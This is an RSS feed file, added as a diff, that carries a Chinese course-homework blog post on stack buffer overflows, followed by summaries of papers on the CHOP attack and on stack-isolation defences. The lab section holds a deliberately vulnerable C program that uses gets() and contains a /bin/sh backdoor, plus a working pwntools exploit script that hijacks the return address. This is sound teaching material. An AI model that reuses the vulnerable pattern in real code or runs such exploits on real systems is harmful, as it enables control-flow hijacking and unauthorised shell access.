@@ -1,0 +1,272 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>课程 on iC0rner</title>
+        <link>http://localhost:1313/categories/%E8%AF%BE%E7%A8%8B/</link>
+        <description>Recent content in 课程 on iC0rner</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-cn</language>
+        <copyright>Example Person</copyright>
+        <lastBuildDate>Fri, 18 Apr 2025 14:14:02 +0800</lastBuildDate><atom:link href="http://localhost:1313/categories/%E8%AF%BE%E7%A8%8B/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>栈溢出攻击</title>
+        <link>http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/</link>
+        <pubDate>Fri, 18 Apr 2025 14:14:02 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/</guid>
+        <description>&lt;img src="http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-7.png" alt="Featured image of post 栈溢出攻击" /&gt;&lt;h2 id=&#34;1栈溢出攻击实践&#34;&gt;1.栈溢出攻击实践
+&lt;/h2&gt;&lt;h3 id=&#34;11-实验环境&#34;&gt;1.1 实验环境
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;操作系统：虚拟机 Ubuntu 16.04 LTS&lt;/li&gt;
+&lt;li&gt;编译器：gcc 9.3.0&lt;/li&gt;
+&lt;li&gt;攻击工具：python 3.8 | pwntools | IDA Pro 8.5&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;12-实验步骤&#34;&gt;1.2 实验步骤
+&lt;/h3&gt;&lt;h4 id=&#34;121-编写漏洞程序&#34;&gt;1.2.1 编写漏洞程序
+&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;backdoor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// 自定义的函数
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nf&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 后门函数执行shell
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;网络攻击检测作业3_梁铭杰&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 一个缓冲区
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nf&#34;&gt;gets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// 不安全的输入函数导致栈溢出
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;code&gt;gets&lt;/code&gt;函数为不安全的输入函数，当输入的字符数超过缓冲区大小时，会发生栈溢出。&lt;/p&gt;
+&lt;p&gt;而&lt;code&gt;backdoor&lt;/code&gt;函数为后门函数，当程序执行到该函数时，会执行&lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;，即执行&lt;code&gt;/bin/sh&lt;/code&gt;命令，从而获得shell。&lt;/p&gt;
+&lt;p&gt;按照程序正常执行流程，并不会执行&lt;code&gt;backdoor&lt;/code&gt;函数，接下来将进行漏洞利用。&lt;/p&gt;
+&lt;h4 id=&#34;122-编译漏洞程序&#34;&gt;1.2.2 编译漏洞程序
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;为尽可能保证仅仅关注栈溢出攻击以及作业要求（使用栈溢出跳转到自定义函数）
+在编译时关闭Canary金丝雀和ASLR地址随机化&lt;/strong&gt;
+&lt;code&gt;gcc vuln.c  -fno-stack-protector  -no-pie -o vuln&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&#34;122-ida分析漏洞程序&#34;&gt;1.2.2 IDA分析漏洞程序
+&lt;/h4&gt;&lt;p&gt;将程序移进IDA进行反编译分析
+&lt;img src=&#34;http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-7.png&#34;
+	width=&#34;1130&#34;
+	height=&#34;393&#34;
+	srcset=&#34;http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-7_hu_623c6126ff3b111d.png 480w, http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-7_hu_3c2cd1a410b2b06a.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;alt text&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;287&#34;
+		data-flex-basis=&#34;690px&#34;
+	
+&gt;
+IDA给出所有函数的地址以及反编译内容
+再进入main函数的v4变量，即源代码中buffer变量缓冲区
+&lt;img src=&#34;http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-1.png&#34;
+	width=&#34;716&#34;
+	height=&#34;202&#34;
+	srcset=&#34;http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-1_hu_fb45d5e83be86252.png 480w, http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-1_hu_b243427dcfa45e3e.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;alt text&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;354&#34;
+		data-flex-basis=&#34;850px&#34;
+	
+&gt;
+可见需要输入0x40(buffer变量设定长度)+0x8(栈帧rbp)=0x48才能到达返回地址
+&lt;strong&gt;关注重点&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;backdoor函数地址为&lt;code&gt;0x0000000004005B6&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;覆盖长度0x48,而往后的0x8用来覆盖地址&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;攻击思路&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;在v4变量中输入0x48个字符后，再输入0x8个字节即可覆盖返回地址&lt;/li&gt;
+&lt;li&gt;将返回地址设置为backdoor函数地址，达成利用&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;123-编写攻击程序&#34;&gt;1.2.3 编写攻击程序
+&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;                              &lt;span class=&#34;c1&#34;&gt;# 导入pwntools&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;# 日志环境&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;backdoor&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0000000004005B6&lt;/span&gt;                    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;./vuln&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;                            &lt;span class=&#34;c1&#34;&gt;# 进程&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;                              &lt;span class=&#34;c1&#34;&gt;# 接收输入&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pl&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x48&lt;/span&gt;                                 &lt;span class=&#34;c1&#34;&gt;# 输入0x48个字符&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;pl&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;backdoor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;                            &lt;span class=&#34;c1&#34;&gt;# 覆盖返回地址&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;                                 &lt;span class=&#34;c1&#34;&gt;# 发送&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;                                &lt;span class=&#34;c1&#34;&gt;# 回归用户与进程的交互&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id=&#34;124-攻击&#34;&gt;1.2.4 攻击
+&lt;/h4&gt;&lt;h5 id=&#34;1241-攻击效果&#34;&gt;1.2.4.1 攻击效果
+&lt;/h5&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-3.png&#34;
+	width=&#34;727&#34;
+	height=&#34;407&#34;
+	srcset=&#34;http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-3_hu_82db4c8a9e54b420.png 480w, http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-3_hu_1418baee1f1689ca.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;alt text&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;178&#34;
+		data-flex-basis=&#34;428px&#34;
+	
+&gt;
+在脚本与程序交互后，程序成功执行&lt;code&gt;backdoor&lt;/code&gt;函数，获得shell
+回归用户与进程的交互后，输入whoami，可以显示当前用户名，与直接使用终端的用户相同
+攻击利用达成&lt;/p&gt;
+&lt;h5 id=&#34;1242-攻击过程&#34;&gt;1.2.4.2 攻击过程
+&lt;/h5&gt;&lt;p&gt;此处交由GDB调试来具体展示过程
+由于需要完成栈溢出攻击并跳转到自定义函数，因此是需要控制程序执行流
+在此处只能够在main函数结束时完成攻击
+&lt;img src=&#34;http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-6.png&#34;
+	width=&#34;757&#34;
+	height=&#34;316&#34;
+	srcset=&#34;http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-6_hu_50fb2e5f1a38a459.png 480w, http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-6_hu_a3765152cd08a378.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;alt text&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;239&#34;
+		data-flex-basis=&#34;574px&#34;
+	
+&gt;
+因此在main函数的retn返回处下断点
+&lt;strong&gt;正常程序&lt;/strong&gt;
+&lt;img src=&#34;http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-5.png&#34;
+	width=&#34;889&#34;
+	height=&#34;226&#34;
+	srcset=&#34;http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-5_hu_464f0e34791f450f.png 480w, http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-5_hu_54c24001109addc4.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;alt text&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;393&#34;
+		data-flex-basis=&#34;944px&#34;
+	
+&gt;
+正常程序下，程序执行到retn处，返回到调用main函数的地址(__libc_start_main+176)，即程序结束&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;攻击程序&lt;/strong&gt;
+&lt;img src=&#34;http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-4.png&#34;
+	width=&#34;730&#34;
+	height=&#34;320&#34;
+	srcset=&#34;http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-4_hu_a3aa0a01c7e22554.png 480w, http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-4_hu_a3dba4de86747af5.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;alt text&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;228&#34;
+		data-flex-basis=&#34;547px&#34;
+	
+&gt;
+攻击程序下，程序执行到retn处，返回到backdoor函数，获取shell后，该程序运行结束&lt;/p&gt;
+&lt;h2 id=&#34;2栈溢出攻击与防御的文献阅读&#34;&gt;2.栈溢出攻击与防御的文献阅读
+&lt;/h2&gt;&lt;h3 id=&#34;21-攻击类文献ppt中汇报的&#34;&gt;2.1 攻击类文献（PPT中汇报的）
+&lt;/h3&gt;&lt;h4 id=&#34;let-me-unwind-that-for-you-exceptions-to-backward-edge-protection让我为你解开后沿保护的例外&#34;&gt;Let Me Unwind That For You: Exceptions to Backward-Edge Protection（让我为你解开：后沿保护的例外）
+&lt;/h4&gt;&lt;h5 id=&#34;211-问题背景&#34;&gt;2.1.1 问题背景
+&lt;/h5&gt;&lt;p&gt;传统的堆栈缓冲区溢出攻击（尤其是利用返回地址篡改实现的后向控制流劫持）长期以来一直是软件攻击的一个关键点。为了防范这类攻击，学术界和工业界提出了多种后向保护机制，例如栈保护(canaries)和影子栈(shadow stacks)。这些防护措施的基本假设是：攻击者必须直接篡改返回地址才能劫持控制流，从而可以通过检测返回时的数据完整性来防御攻击。&lt;/p&gt;
+&lt;h5 id=&#34;212-动机&#34;&gt;2.1.2 动机
+&lt;/h5&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-8.png&#34;
+	width=&#34;448&#34;
+	height=&#34;111&#34;
+	srcset=&#34;http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-8_hu_1c237bab215f1ed1.png 480w, http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-8_hu_1f6dc268fd102de3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;传统防御方案的不足&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;403&#34;
+		data-flex-basis=&#34;968px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;论文作者注意到，尽管这些防护机制在传统场景下非常有效，但它们普遍依赖一个关键假设：即攻击者必须通过直接控制返回地址来实现攻击。然而，论文指出，攻击者并不一定需要直接劫持返回地址，而可以利用异常处理机制在堆栈展开过程中实现控制流劫持。这种方法绕过了传统后向保护机制，从而开启了一种新的攻击范式。&lt;/p&gt;
+&lt;h5 id=&#34;213-论文方案设计&#34;&gt;2.1.3 论文方案设计
+&lt;/h5&gt;&lt;p&gt;论文提出了一种名为 Catch Handler Oriented Programming (CHOP) 的新型攻击技术，其核心思想在于利用常规后向保护机制未覆盖的异常处理进行堆栈展开，进而可进行传统的ROP攻击。
+当程序触发异常时，运行时系统会走异常处理的流程（即“堆栈展开”），其过程中会依据堆栈上的元数据找到合适的异常处理程序（catch handler）或清理代码(cleanup handler)。如果攻击者能够利用堆栈溢出漏洞破坏堆栈数据，那么在异常处理过程中，运行时系统会按照攻击者构造的数据进行堆栈展开，进而“误导”异常处理逻辑跳转到攻击者控制的处理程序。
+论文提出的 CHOP 攻击正是基于此原理展开，其核心在于定义并利用“混淆原语”（Confusion Primitives），即通过破坏特定堆栈数据结构，让异常展开逻辑误将攻击者构造的数据当作合法跳转目标或状态恢复信息。通过这种方式，攻击者可在异常处理过程中构造出多个具备关键功能的“gadget”，类似于传统 ROP（Return-Oriented Programming）攻击中所用的代码片段。作者通过对大量文件进行分析，发现这些 gadget 在现实世界中非常普遍，尤其是在使用 C++ 异常机制的程序中，异常处理器常常含有内存读写、控制流转移等指令，极易被利用构建攻击链。&lt;/p&gt;
+&lt;h5 id=&#34;214-实验&#34;&gt;2.1.4 实验：
+&lt;/h5&gt;&lt;p&gt;文章对多个平台（包括 Linux、macOS、Windows、Android 和 iOS）进行了跨体系结构的测试，基于 Debian Buster 发行版中的上千个流行程序包展开大规模分析。实验表明，约 10% 的程序包含可被利用的异常处理逻辑，并在其中识别出了数量庞大的潜在 CHOP gadget。另外，作者还用CVE-2009-4009和SCSSU-201801来举例通过CHOP构造的攻击样本可以在实际系统中实现任意内存写、控制流劫持及数据泄漏等复杂攻击。&lt;/p&gt;
+&lt;h5 id=&#34;215-防御措施与改进建议&#34;&gt;2.1.5 防御措施与改进建议：
+&lt;/h5&gt;&lt;p&gt;在短期缓解上，论文建议在堆栈展开（异常处理）过程中扩展栈 canary 检查，从而在异常抛出时检测堆栈数据是否被修改。可以考虑对异常处理元数据进行完整性校验或者采用与异常处理紧密耦合的安全机制（例如在 shadow stack 实现上修改堆栈展开逻辑，使其依赖于更安全的备份数据）。
+而对于较彻底的防御，论文建议在编译器和运行时系统中，对异常处理（包括 try/catch 块内及其清理代码）进行更严格的安全性检查，从根本上防止攻击者利用异常处理流程进行控制流劫持，或是采用先进的防护策略（如函数随机化、细粒度随机化）来降低攻击者预测异常处理代码地址的能力。&lt;/p&gt;
+&lt;h5 id=&#34;216-总结和展望&#34;&gt;2.1.6 总结和展望：
+&lt;/h5&gt;&lt;p&gt;全文通过对传统后向保护机制局限性的深刻分析，展示了攻击者如何利用异常处理中的堆栈展开流程来实现控制流劫持，即 CHOP 攻击。此方法绕过了目前广泛采用的防护措施（如金丝雀和影子栈），而且在多个平台上均能成功实施，具有很强的现实威胁。未来的研究可能会进一步探讨更加完善的异常处理安全机制，以及如何在不影响性能的前提下集成更多安全检查，以防止类似 CHOP 这样的新型攻击方式。&lt;/p&gt;
+&lt;h3 id=&#34;22-防御类文献&#34;&gt;2.2 防御类文献
+&lt;/h3&gt;&lt;h4 id=&#34;the-taming-of-the-stack-isolating-stack-data-from-memory-errors堆栈驯服将堆栈数据与内存错误隔离&#34;&gt;The Taming of the Stack: Isolating Stack Data from Memory Errors堆栈驯服：将堆栈数据与内存错误隔离
+&lt;/h4&gt;&lt;h4 id=&#34;221-问题背景&#34;&gt;2.2.1 问题背景
+&lt;/h4&gt;&lt;p&gt;传统的堆栈防护（例如使用金丝雀、影子栈以及安全栈机制）主要关注于防止对代码指针的修改，从而阻断传统的缓冲区溢出攻击，即侧重于保护返回地址等关键代码指针。然而，随着攻击技术的演进，攻击者不仅针对返回地址，还可能利用空间错误（buffer overflow/underflow）、类型错误（type confusion）和时间错误（temporal errors，如使用未初始化或已释放的指针）来修改堆栈中其他敏感数据或窃取信息。这些额外的内存错误如果得不到防护，仍然会给系统带来风险。&lt;/p&gt;
+&lt;h4 id=&#34;222-动机&#34;&gt;2.2.2 动机
+&lt;/h4&gt;&lt;p&gt;现有的安全机制在设计上过于保守，将大量对象归类为“不安全”，从而不得不牺牲较多不必要的操作以对这些对象进行保护；同时，部分防御仅仅能保护返回地址，而无法全面防护堆栈上的所有数据对象。论文的目标在于如何能够更精确地验证哪些堆栈对象真正安全，从而将这些对象隔离到“安全堆栈”中，以阻断各种内存错误的利用，同时降低运行时开销。&lt;/p&gt;
+&lt;h4 id=&#34;223-论文方案设计&#34;&gt;2.2.3 论文方案设计
+&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-9.png&#34;
+	width=&#34;554&#34;
